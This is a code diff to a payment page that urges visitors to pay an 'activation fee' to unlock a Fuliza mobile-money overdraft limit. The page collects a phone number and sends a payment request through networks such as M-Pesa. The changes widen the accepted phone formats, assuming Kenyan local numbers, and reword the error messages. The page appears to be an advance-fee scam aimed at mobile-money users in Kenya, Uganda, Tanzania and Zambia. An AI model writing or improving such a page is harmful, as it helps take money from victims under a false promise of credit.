@@ -15,7 +15,7 @@ input{width:100%;padding:12px;margin-top:15px;border:1px solid #ddd;border-radiu
 .spinner{margin-top:15px;display:none;}
 .loader{border:4px solid #f3f3f3;border-top:4px solid #1fb141;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;margin:auto;}
 @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
-.message{margin-top:15px;font-size:14px;}
+.message{margin-top:15px;font-size:14px;color:#555;}
 .encourage{margin-top:20px;font-size:14px;color:#555;}
 </style>
 </head>
@@ -33,7 +33,7 @@ Pay your activation fee today to unlock your desired Fuliza limit instantly. Ens
 <div class="info">Selected Limit: <strong id="limit"></strong></div>
 <div class="info">Activation Fee: <strong id="fee"></strong></div>
 
-<input type="tel" id="phone" placeholder="Enter your phone number with country code">
+<input type="tel" id="phone" placeholder="Enter your phone number (07XXXXXXXX / 254XXXXXXXX / +254XXXXXXXX)">
 
 <button class="pay-btn" onclick="payNow()">Pay Activation Fee Now</button>
 
@@ -54,29 +54,33 @@ document.getElementById("fee").innerText = "KSh " + activationFee;
 
 // Country codes mapping by prefix
 const countryPrefixes = { '254': 'KE', '256': 'UG', '255': 'TZ', '260': 'ZM' };
-
-// Default network by country
 const defaultNetwork = { 'KE': 'MPESA', 'UG': 'MTN', 'TZ': 'TIGO', 'ZM': 'ZAMTEL' };
 
+// Normalize phone and detect country
+function normalizePhone(input){
+  let phone = input.trim();
+  if(phone.startsWith('+')) phone = phone.substring(1);
+  if(phone.startsWith('0')) phone = '254' + phone.substring(1); // assume KE for local format
+  const prefix = phone.substring(0,3);
+  const country = countryPrefixes[prefix];
+  return { phone: country === 'KE' ? phone : '+' + phone, country };
+}
+
 async function payNow(){
-  const phoneInput = document.getElementById("phone").value.trim();
+  const phoneInput = document.getElementById("phone").value;
   const msg = document.getElementById("message");
   const spinner = document.getElementById("spinner");
 
+  msg.innerText = "";
   if(!phoneInput){
-    msg.innerText = "Enter your phone number with country code";
+    msg.innerText = "Enter your phone number";
     msg.style.color = "red";
     return;
   }
 
-  // Normalize phone to include '+'
-  let phoneToSend = phoneInput.startsWith('+') ? phoneInput : '+' + phoneInput;
-
-  // Detect country using first 3 digits after '+'
-  let phonePrefix = phoneToSend.substring(1,4);
-  const country = countryPrefixes[phonePrefix];
+  const { phone: phoneToSend, country } = normalizePhone(phoneInput);
   if(!country){
-    msg.innerText = "Sorry, start with country code, only Kenya, Uganda, Tanzania, and Zambia are supported";
+    msg.innerText = "Unsupported country. Only Kenya, Uganda, Tanzania, Zambia allowed.";
     msg.style.color = "red";
     return;
   }
@@ -94,8 +98,8 @@ async function payNow(){
       body: JSON.stringify({
         phone_number: phoneToSend,
         amount: Number(activationFee),
-        country: country,
-        network: network
+        country,
+        network
       })
     });
     const data = await res.json();
@@ -111,7 +115,7 @@ async function payNow(){
     }
 
   } catch(err){
-    spinner.style.display="none";
+    spinner.style.display = "none";
     msg.innerText="Server error: " + (err.message || "Try again");
     msg.style.color="red";
   }
